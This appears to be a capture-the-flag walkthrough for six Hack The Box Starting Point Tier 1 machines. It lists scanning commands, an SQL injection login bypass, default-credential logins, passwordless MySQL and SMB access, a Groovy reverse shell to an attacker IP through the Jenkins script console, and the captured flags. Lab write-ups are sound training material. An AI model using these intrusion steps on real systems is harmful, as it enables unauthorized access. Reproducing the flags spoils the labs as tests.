# HTB-Tier-1-CTF

## STARTING POINT Tier 1 Machines

https://app.hackthebox.com/starting-point

# Appointment 

Use nmap to scan for open ports : sudo nmap -sS -sV 10.129.117.169  

	PORT   STATE SERVICE VERSION

	80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Use sudo gobuster dir -u http://10.129.117.169 -w /usr/share/wordlists/dirb/common.txt to find any info 

Nothing special came out

Head to the website and a login page will appear

From the clue given in the question use SQL injection ('#) to comment on the code

Try username : admin'# and password: password123 to get the flag

###### 🏴‍☠️ HTB{e3d0796d002a446c0e622226f42e9672} 


# Sequel

**Use nmap to scan for open ports : sudo nmap -sS -sV 10.129.121.245** 

	PORT     STATE SERVICE

	3306/tcp open  mysql

mysql -h 10.129.121.245 -u root 

**Use the following commands to explore the database :**

	SHOW databases;

	SHOW tables;

	SELECT * FROM config;

###### 🏴‍☠️ HTB{7b4bec00d1a39e3dd4e021ec3d915da8} 

# Crocodile

**Use nmap to scan for open ports : sudo nmap -sC -sV 10.129.115.58** 

	PORT   STATE SERVICE VERSION

	21/tcp open  ftp     vsftpd 3.0.3

	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Connect to the FTP server via anonymous : ftp 10.129.115.58

GET both files 

Head to the webserver and install Wappalyzer to see technologies used on the website

**Use gobuster to find more clues : gobuster dir --url http://10.129.115.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html**

	/login.php            (Status: 200) [Size: 1577]

head to the login.php page and login with admin and last password found on the ftp server file 

###### 🏴‍☠️ HTB{c7110277ac44d78b6a9fff2232434d16}

# Ignition 

**Use nmap to scan for open ports : sudo nmap -sS -sC -sV 10.129.131.144**  

	PORT   STATE SERVICE VERSION

	80/tcp open  http    nginx 1.14.2

curl -v http://10.129.131.144

echo "10.129.131.144 ignition.htb" | sudo tee -a /etc/hosts  

cat /etc/hosts 

**gobuster dir --url http://ignition.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt**
	
	/admin                (Status: 200) [Size: 7092]

Head to the link and a login page will appear

After trying common passwords : username - admin password - qwerty123

###### 🏴‍☠️ HTB{797d6c988d9dc5865e010b9410f247e0}

# Pennyworth

**Use nmap to scan for open ports : sudo nmap -sS -sC -sV 10.129.131.150**

	PORT     STATE SERVICE VERSION

	8080/tcp open  http    Jetty 9.4.39.v20210325

Head to http://10.129.131.150:8080

Google search Jenkins default password and try them out : user - root , password - password

http://10.129.131.150:8080/script

**Head to https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md** 

Find the Groovy reverse shell script 

**start a netcat : nc -lvpn** 

Change the ip , host and cmd file and run the script :

	String host="10.10.14.5";

	int port=8000;

	String cmd="/bin/bash";

netcat will start a session, cd to root and cat the final flag

###### 🏴‍☠️ HTB{9cdfb439c7876e703e307864c9167a15} 

# Tactics 

**Use nmap to scan for open ports : sudo nmap -sS -sC -sV 10.129.131.167**

	PORT    STATE SERVICE       VERSION

	135/tcp open  msrpc         Microsoft Windows RPC

	139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn

	445/tcp open  microsoft-ds?

**smbclient -L 10.129.131.167 -U Administrator** 

	Sharename       Type      Comment

        ---------       ----      -------
        ADMIN$          Disk      Remote Admin

        C$              Disk      Default share

        IPC$            IPC       Remote IPC

**smbclient \\\\10.129.131.167\\C$ -U Administrator** 

dir Users\Administrator\Desktop to get the flag

###### 🏴‍☠️ HTB{f751c19eda8f61ce81827e6930a1f40c}
